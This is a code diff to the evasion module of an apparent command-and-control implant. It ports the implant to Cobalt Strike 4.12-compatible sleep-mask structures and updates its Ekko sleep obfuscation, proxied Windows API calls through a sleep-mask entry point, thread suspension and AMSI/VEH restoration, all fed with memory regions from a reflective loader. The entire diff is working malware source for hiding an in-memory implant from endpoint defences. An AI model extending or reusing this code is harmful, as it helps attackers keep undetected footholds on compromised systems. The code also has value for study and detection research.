@@ -123,63 +123,132 @@ static auto declfn iat_camouflage( instance& inst ) -> void {
 
 #include <evasion/sleepmask_vs_data.h>
 
-#define BOF_MASK_SIZE_SM 13
+// CS beacon.h 4.12 compatible types
 
-struct sm_heap_record { char* ptr; size_t size; };
+#define MASK_SIZE 13
+#define DLL_BEACON_USER_DATA 0x0d
+#define BEACON_USER_DATA_CUSTOM_SIZE 32
 
-struct sm_alloc_section {
-    int Label; PVOID BaseAddress; SIZE_T VirtualSize;
-    DWORD CurrentProtect; DWORD PreviousProtect;
-    BOOL MaskSection; DWORD DripLoadPageSize;
+struct HEAP_RECORD { char* ptr; size_t size; };
+
+enum ALLOCATED_MEMORY_PURPOSE {
+    PURPOSE_EMPTY, PURPOSE_GENERIC_BUFFER, PURPOSE_BEACON_MEMORY,
+    PURPOSE_SLEEPMASK_MEMORY, PURPOSE_BOF_MEMORY, PURPOSE_UDC2_MEMORY,
+    PURPOSE_USER_DEFINED_MEMORY = 1000
 };
 
-struct sm_alloc_cleanup {
-    BOOL Cleanup; int AllocationMethod; uint8_t AdditionalInfo[16];
+enum ALLOCATED_MEMORY_LABEL {
+    LABEL_EMPTY, LABEL_BUFFER, LABEL_PEHEADER, LABEL_TEXT,
+    LABEL_RDATA, LABEL_DATA, LABEL_PDATA, LABEL_RELOC,
+    LABEL_USER_DEFINED = 1000
 };
 
-struct sm_alloc_region {
-    int Purpose; PVOID AllocationBase; SIZE_T RegionSize; DWORD Type;
-    DWORD DripLoadAllocationGranularity;
-    sm_alloc_section Sections[8];
-    sm_alloc_cleanup CleanupInformation;
+enum ALLOCATED_MEMORY_ALLOCATION_METHOD {
+    METHOD_UNKNOWN, METHOD_VIRTUALALLOC, METHOD_HEAPALLOC,
+    METHOD_MODULESTOMP, METHOD_NTMAPVIEW, METHOD_USER_DEFINED = 1000
 };
 
-struct sm_alloc_memory { sm_alloc_region AllocatedMemoryRegions[6]; };
+struct HEAPALLOC_INFO    { PVOID HeapHandle; BOOL DestroyHeap; };
+struct MODULESTOMP_INFO  { HMODULE ModuleHandle; };
 
-struct sm_beacon_info {
-    unsigned int     version;
-    char*            sleep_mask_ptr;
-    DWORD            sleep_mask_text_size;
-    DWORD            sleep_mask_total_size;
-    char*            beacon_ptr;
-    sm_heap_record*  heap_records;
-    char             mask[BOF_MASK_SIZE_SM];
-    sm_alloc_memory  allocatedMemory;
+union ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION {
+    HEAPALLOC_INFO   HeapAllocInfo;
+    MODULESTOMP_INFO ModuleStompInfo;
+    PVOID            Custom;
 };
 
-enum sm_win_api {
-    SM_INTERNETOPENA, SM_INTERNETCONNECTA,
-    SM_VIRTUALALLOC, SM_VIRTUALALLOCEX, SM_VIRTUALPROTECT, SM_VIRTUALPROTECTEX, SM_VIRTUALFREE,
-    SM_GETTHREADCONTEXT, SM_SETTHREADCONTEXT, SM_RESUMETHREAD,
-    SM_CREATETHREAD, SM_CREATEREMOTETHREAD,
-    SM_OPENPROCESS, SM_OPENTHREAD, SM_CLOSEHANDLE,
-    SM_CREATEFILEMAPPING, SM_MAPVIEWOFFILE, SM_UNMAPVIEWOFFILE,
-    SM_VIRTUALQUERY, SM_DUPLICATEHANDLE,
-    SM_READPROCESSMEMORY, SM_WRITEPROCESSMEMORY,
-    SM_EXITTHREAD, SM_VIRTUALFREEEX, SM_VIRTUALQUERYEX,
-    SM_WAITFORSINGLEOBJECT, SM_SLEEP
+struct ALLOCATED_MEMORY_CLEANUP_INFORMATION {
+    BOOL Cleanup;
+    ALLOCATED_MEMORY_ALLOCATION_METHOD AllocationMethod;
+    ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION AdditionalCleanupInformation;
 };
 
-struct sm_function_call {
-    PVOID      functionPtr;
-    sm_win_api function;
-    int        numOfArgs;
-    ULONG_PTR  args[10];
-    BOOL       bMask;
-    ULONG_PTR  retValue;
+struct ALLOCATED_MEMORY_SECTION {
+    ALLOCATED_MEMORY_LABEL Label;
+    PVOID  BaseAddress;
+    SIZE_T VirtualSize;
+    DWORD  CurrentProtect;
+    DWORD  PreviousProtect;
+    BOOL   MaskSection;
+    DWORD  DripLoadPageSize;
 };
 
-typedef void (*sm_entry_fn)( sm_beacon_info*, sm_function_call* );
+struct ALLOCATED_MEMORY_REGION {
+    ALLOCATED_MEMORY_PURPOSE Purpose;
+    PVOID  AllocationBase;
+    SIZE_T RegionSize;
+    DWORD  Type;
+    DWORD  DripLoadAllocationGranularity;
+    ALLOCATED_MEMORY_SECTION Sections[8];
+    ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation;
+};
+
+struct ALLOCATED_MEMORY {
+    ALLOCATED_MEMORY_REGION AllocatedMemoryRegions[6];
+};
+
+struct BEACON_INFO {
+    unsigned int   version;
+    char*          sleep_mask_ptr;
+    DWORD          sleep_mask_text_size;
+    DWORD          sleep_mask_total_size;
+    char*          beacon_ptr;
+    HEAP_RECORD*   heap_records;
+    char           mask[MASK_SIZE];
+    ALLOCATED_MEMORY allocatedMemory;
+};
+
+struct SYSCALL_API_ENTRY { PVOID fnAddr; PVOID jmpAddr; DWORD sysnum; };
+struct SYSCALL_API {
+    SYSCALL_API_ENTRY ntAllocateVirtualMemory, ntProtectVirtualMemory,
+        ntFreeVirtualMemory, ntGetContextThread, ntSetContextThread,
+        ntResumeThread, ntCreateThreadEx, ntOpenProcess, ntOpenThread,
+        ntClose, ntCreateSection, ntMapViewOfSection, ntUnmapViewOfSection,
+        ntQueryVirtualMemory, ntDuplicateObject, ntReadVirtualMemory,
+        ntWriteVirtualMemory, ntReadFile, ntWriteFile, ntCreateFile,
+        ntQueueApcThread, ntCreateProcess, ntOpenProcessToken, ntTestAlert,
+        ntSuspendProcess, ntResumeProcess, ntQuerySystemInformation,
+        ntQueryDirectoryFile, ntSetInformationProcess, ntSetInformationThread,
+        ntQueryInformationProcess, ntQueryInformationThread, ntOpenSection,
+        ntAdjustPrivilegesToken, ntDeviceIoControlFile, ntWaitForMultipleObjects;
+};
+struct RTL_API {
+    PVOID rtlDosPathNameToNtPathNameUWithStatusAddr;
+    PVOID rtlFreeHeapAddr;
+    PVOID rtlGetProcessHeapAddr;
+};
+
+struct USER_DATA {
+    unsigned int      version;
+    SYSCALL_API*      syscalls;
+    char              custom[BEACON_USER_DATA_CUSTOM_SIZE];
+    RTL_API*          rtls;
+    ALLOCATED_MEMORY* allocatedMemory;
+};
+
+enum WinApi {
+    INTERNETOPENA, INTERNETCONNECTA,
+    VIRTUALALLOC, VIRTUALALLOCEX, VIRTUALPROTECT, VIRTUALPROTECTEX, VIRTUALFREE,
+    GETTHREADCONTEXT, SETTHREADCONTEXT, RESUMETHREAD,
+    CREATETHREAD, CREATEREMOTETHREAD,
+    OPENPROCESS, OPENTHREAD, CLOSEHANDLE,
+    CREATEFILEMAPPING, MAPVIEWOFFILE, UNMAPVIEWOFFILE,
+    VIRTUALQUERY, DUPLICATEHANDLE,
+    READPROCESSMEMORY, WRITEPROCESSMEMORY,
+    EXITTHREAD, VIRTUALFREEEX, VIRTUALQUERYEX,
+    WAITFORSINGLEOBJECT, SLEEP
+};
+
+struct FUNCTION_CALL {
+    PVOID     functionPtr;
+    WinApi    function;
+    int       numOfArgs;
+    ULONG_PTR args[10];
+    BOOL      bMask;
+    ULONG_PTR retValue;
+};
+
+typedef void (*SLEEPMASK_ENTRY)( BEACON_INFO*, FUNCTION_CALL* );
 
 #ifndef TH32CS_SNAPTHREAD
 #define TH32CS_SNAPTHREAD 0x00000004
@@ -572,11 +641,11 @@ static auto declfn load_sleepmask_coff( instance& inst ) -> bool {
     return true;
 }
 
-static auto declfn build_sm_beacon_info(
-    instance& inst, sm_beacon_info& info, sm_heap_record& sentinel
+static auto declfn build_beacon_info(
+    instance& inst, BEACON_INFO& info, HEAP_RECORD& sentinel
 ) -> void {
-    memory::zero( &info, sizeof( sm_beacon_info ) );
-    memory::zero( &sentinel, sizeof( sm_heap_record ) );
+    memory::zero( &info, sizeof( BEACON_INFO ) );
+    memory::zero( &sentinel, sizeof( HEAP_RECORD ) );
 
     info.version = 0x041200;
     info.sleep_mask_ptr = reinterpret_cast<char*>( inst.evasion.sleepmask_vs.code_base );
@@ -585,15 +654,16 @@ static auto declfn build_sm_beacon_info(
 
     uintptr_t beacon_base = 0;
     uint32_t  beacon_size = 0;
-    bool      udrl_valid  = false;
-    uint8_t*  ud          = nullptr;
+    USER_DATA* ud         = nullptr;
 
     if ( inst.evasion.udrl_user_data ) {
-        ud = reinterpret_cast<uint8_t*>( inst.evasion.udrl_user_data );
-        if ( *reinterpret_cast<uint64_t*>( ud ) == 0x5442525354ULL ) {
-            beacon_base = *reinterpret_cast<uintptr_t*>( ud + 0x10 );
-            beacon_size = *reinterpret_cast<uint32_t*>( ud + 0x18 );
-            udrl_valid = true;
+        ud = reinterpret_cast<USER_DATA*>( inst.evasion.udrl_user_data );
+        if ( ud->allocatedMemory ) {
+            auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[0];
+            if ( reg.AllocationBase ) {
+                beacon_base = reinterpret_cast<uintptr_t>( reg.AllocationBase );
+                beacon_size = static_cast<uint32_t>( reg.RegionSize );
+            }
         }
     }
 
@@ -610,83 +680,55 @@ static auto declfn build_sm_beacon_info(
     info.beacon_ptr = reinterpret_cast<char*>( beacon_base );
 
     if ( inst.evasion.ekko.initialized ) {
-        for ( int i = 0; i < BOF_MASK_SIZE_SM && i < 16; i++ )
+        for ( int i = 0; i < MASK_SIZE && i < 16; i++ )
             info.mask[i] = static_cast<char>( inst.evasion.ekko.rc4_key[i] );
     } else {
         ULONG seed = inst.kernel32.GetTickCount();
-        for ( int i = 0; i < BOF_MASK_SIZE_SM; i++ ) {
+        for ( int i = 0; i < MASK_SIZE; i++ ) {
             seed = inst.ntdll.RtlRandomEx( &seed );
             info.mask[i] = static_cast<char>( seed & 0xFF );
         }
     }
 
-    sentinel.ptr = nullptr;
-    sentinel.size = 0;
-    info.heap_records = &sentinel;
-
-    if ( udrl_valid ) {
-        //
-        // Parse UDRL_USER_DATA regions (x64 layout, natural alignment)
-        //
-        // UDRL_USER_DATA: regions[8] at +0x48, each UDRL_REGION = 0xA0 bytes
-        //   region_count at +0x48 + 8*0xA0 = +0x548
-        // UDRL_REGION: purpose +0x00, alloc_base +0x08, region_size +0x10,
-        //   sections[4] at +0x18 (each 0x20), section_count at +0x98
-        // UDRL_SECTION: label +0x00, base +0x08, size +0x10, protect +0x18
-        //
-        uint32_t region_count = *reinterpret_cast<uint32_t*>( ud + 0x548 );
-        if ( region_count > 8 ) region_count = 8;
-
-        int sm_idx = 0;
-        for ( uint32_t r = 0; r < region_count && sm_idx < 6; r++ ) {
-            uint8_t* reg = ud + 0x48 + r * 0xA0;
-
-            uint32_t purpose = *reinterpret_cast<uint32_t*>( reg );
-            void*    abase   = *reinterpret_cast<void**>( reg + 0x08 );
-            size_t   rsize   = *reinterpret_cast<size_t*>( reg + 0x10 );
-            uint32_t sec_cnt = *reinterpret_cast<uint32_t*>( reg + 0x98 );
-
-            if ( !abase ) continue;
-
-            auto& sm_reg = info.allocatedMemory.AllocatedMemoryRegions[sm_idx];
-            sm_reg.Purpose        = static_cast<int>( purpose + 2 );
-            sm_reg.AllocationBase = abase;
-            sm_reg.RegionSize     = rsize;
-            sm_reg.Type           = MEM_PRIVATE;
-
-            if ( sec_cnt > 4 ) sec_cnt = 4;
-            for ( uint32_t s = 0; s < sec_cnt; s++ ) {
-                uint8_t* sp = reg + 0x18 + s * 0x20;
-
-                uint32_t label   = *reinterpret_cast<uint32_t*>( sp );
-                void*    sbase   = *reinterpret_cast<void**>( sp + 0x08 );
-                size_t   ssize   = *reinterpret_cast<size_t*>( sp + 0x10 );
-                uint32_t protect = *reinterpret_cast<uint32_t*>( sp + 0x18 );
-
-                int sm_label = ( label <= 1 )
-                    ? static_cast<int>( label )
-                    : static_cast<int>( label + 1 );
-
-                auto& sm_sec = sm_reg.Sections[s];
-                sm_sec.Label           = sm_label;
-                sm_sec.BaseAddress     = sbase;
-                sm_sec.VirtualSize     = ssize;
-                sm_sec.CurrentProtect  = protect ? protect : sm_query_protection( inst, sbase );
-                sm_sec.PreviousProtect = sm_sec.CurrentProtect;
-                sm_sec.MaskSection     = ( purpose == 0 ) ? TRUE : FALSE;
+    if ( inst.heap_tracker.count > 0 ) {
+        uint32_t n = inst.heap_tracker.count;
+        HEAP_RECORD* records = reinterpret_cast<HEAP_RECORD*>(
+            inst.ntdll.RtlAllocateHeap(
+                NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY,
+                ( n + 1 ) * sizeof( HEAP_RECORD )
+            )
+        );
+        if ( records ) {
+            for ( uint32_t i = 0; i < n; i++ ) {
+                records[i].ptr  = reinterpret_cast<char*>( inst.heap_tracker.entries[i].ptr );
+                records[i].size = inst.heap_tracker.entries[i].size;
             }
-            sm_idx++;
+            records[n].ptr  = nullptr;
+            records[n].size = 0;
+            info.heap_records = records;
+        } else {
+            sentinel.ptr = nullptr;
+            sentinel.size = 0;
+            info.heap_records = &sentinel;
         }
     } else {
+        sentinel.ptr = nullptr;
+        sentinel.size = 0;
+        info.heap_records = &sentinel;
+    }
+
+    if ( ud && ud->allocatedMemory ) {
+        info.allocatedMemory = *ud->allocatedMemory;
+    } else {
         auto& region = info.allocatedMemory.AllocatedMemoryRegions[0];
-        region.Purpose = 2;
+        region.Purpose = PURPOSE_BEACON_MEMORY;
         region.AllocationBase = reinterpret_cast<PVOID>( beacon_base );
         region.RegionSize = beacon_size;
         region.Type = MEM_PRIVATE;
 
         if ( region.AllocationBase && region.RegionSize > 0 ) {
             auto& sec = region.Sections[0];
-            sec.Label = 3;
+            sec.Label = LABEL_TEXT;
             sec.BaseAddress = region.AllocationBase;
             sec.VirtualSize = region.RegionSize;
             DWORD prot = sm_query_protection( inst, region.AllocationBase );
@@ -777,22 +819,12 @@ auto declfn evasion_udrl_sleep( instance& inst, uint32_t sleep_ms ) -> void {
      * Ekko (x64) or full-image XOR fallback.
      */
     if ( inst.evasion.udrl_user_data ) {
-        /* UDRL_USER_DATA layout (with -fpack-struct=8):
-         *   +0x00  uint64  magic
-         *   +0x08  uint32  load_type  (+pad)
-         *   +0x10  ptr     agent_base
-         *   +0x18  uint32  agent_size (+pad)
-         * Use agent_base/size to patch ekko fields so the mask covers
-         * the reflectively loaded image, not the original shellcode. */
-        auto ud = reinterpret_cast<uint8_t*>( inst.evasion.udrl_user_data );
-        uint64_t magic = *reinterpret_cast<uint64_t*>( ud );
-
-        if ( magic == 0x5442525354ULL && inst.evasion.ekko.initialized ) {
-            auto new_base = *reinterpret_cast<uintptr_t*>( ud + 0x10 );
-            auto new_size = *reinterpret_cast<uint32_t*>( ud + 0x18 );
-            if ( new_base && new_size ) {
-                inst.evasion.ekko.img_base = new_base;
-                inst.evasion.ekko.img_size = new_size;
+        auto ud = reinterpret_cast<USER_DATA*>( inst.evasion.udrl_user_data );
+        if ( ud->allocatedMemory && inst.evasion.ekko.initialized ) {
+            auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[0];
+            if ( reg.AllocationBase && reg.RegionSize ) {
+                inst.evasion.ekko.img_base = reinterpret_cast<uintptr_t>( reg.AllocationBase );
+                inst.evasion.ekko.img_size = static_cast<uint32_t>( reg.RegionSize );
             }
         }
     }
@@ -894,13 +926,13 @@ auto declfn evasion_beacon_gate_call(
                 PAGE_EXECUTE_READWRITE, &pre_prot );
         }
 
-        sm_beacon_info info;
-        sm_heap_record sentinel;
-        build_sm_beacon_info( inst, info, sentinel );
+        BEACON_INFO info;
+        HEAP_RECORD sentinel;
+        build_beacon_info( inst, info, sentinel );
 
-        sm_function_call call = {};
+        FUNCTION_CALL call = {};
         call.functionPtr = fn_ptr;
-        call.function    = static_cast<sm_win_api>( win_api_id );
+        call.function    = static_cast<WinApi>( win_api_id );
         call.numOfArgs   = num_args;
         for ( int i = 0; i < num_args && i < 10; i++ )
             call.args[i] = args[i];
@@ -919,7 +951,7 @@ auto declfn evasion_beacon_gate_call(
             sm_suspend_threads( inst );
         }
 
-        auto fn = reinterpret_cast<sm_entry_fn>( inst.evasion.sleepmask_vs.entry );
+        auto fn = reinterpret_cast<SLEEPMASK_ENTRY>( inst.evasion.sleepmask_vs.entry );
         fn( &info, &call );
 
         if ( mask ) {
@@ -938,6 +970,9 @@ auto declfn evasion_beacon_gate_call(
             sm_restore_veh( inst, veh_state );
 #endif
         }
+
+        if ( info.heap_records && info.heap_records != &sentinel )
+            inst.ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, info.heap_records );
 
         return call.retValue;
     }
@@ -972,10 +1007,13 @@ auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> v
         uintptr_t img_base = inst.base.address;
         uint32_t  img_size = inst.base.length;
         if ( inst.evasion.udrl_user_data ) {
-            auto ud = reinterpret_cast<uint8_t*>( inst.evasion.udrl_user_data );
-            if ( *reinterpret_cast<uint64_t*>( ud ) == 0x5442525354ULL ) {
-                img_base = *reinterpret_cast<uintptr_t*>( ud + 0x10 );
-                img_size = *reinterpret_cast<uint32_t*>( ud + 0x18 );
+            auto ud = reinterpret_cast<USER_DATA*>( inst.evasion.udrl_user_data );
+            if ( ud->allocatedMemory ) {
+                auto& reg = ud->allocatedMemory->AllocatedMemoryRegions[0];
+                if ( reg.AllocationBase && reg.RegionSize ) {
+                    img_base = reinterpret_cast<uintptr_t>( reg.AllocationBase );
+                    img_size = static_cast<uint32_t>( reg.RegionSize );
+                }
             }
         }
 
@@ -985,13 +1023,13 @@ auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> v
             img_size,
             PAGE_EXECUTE_READWRITE, &pre_prot );
 
-        sm_beacon_info info;
-        sm_heap_record sentinel;
-        build_sm_beacon_info( inst, info, sentinel );
+        BEACON_INFO info;
+        HEAP_RECORD sentinel;
+        build_beacon_info( inst, info, sentinel );
 
-        sm_function_call call = {};
+        FUNCTION_CALL call = {};
         call.functionPtr = reinterpret_cast<PVOID>( inst.kernel32.WaitForSingleObject );
-        call.function    = SM_WAITFORSINGLEOBJECT;
+        call.function    = WAITFORSINGLEOBJECT;
         call.numOfArgs   = 2;
         call.args[0]     = reinterpret_cast<ULONG_PTR>( (HANDLE)(LONG_PTR)-1 );
         call.args[1]     = static_cast<ULONG_PTR>( sleep_ms );
@@ -1009,7 +1047,7 @@ auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> v
 #endif
         sm_suspend_threads( inst );
 
-        auto fn = reinterpret_cast<sm_entry_fn>( inst.evasion.sleepmask_vs.entry );
+        auto fn = reinterpret_cast<SLEEPMASK_ENTRY>( inst.evasion.sleepmask_vs.entry );
         fn( &info, &call );
 
         DWORD coff_restore = 0;
@@ -1028,6 +1066,9 @@ auto declfn evasion_sleepmask_vs_sleep( instance& inst, uint32_t sleep_ms ) -> v
 #if defined(INCLUDE_EVASION_AMSI) && defined(_WIN64)
         sm_restore_veh( inst, veh_state );
 #endif
+
+        if ( info.heap_records && info.heap_records != &sentinel )
+            inst.ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, info.heap_records );
 
         return;
     }
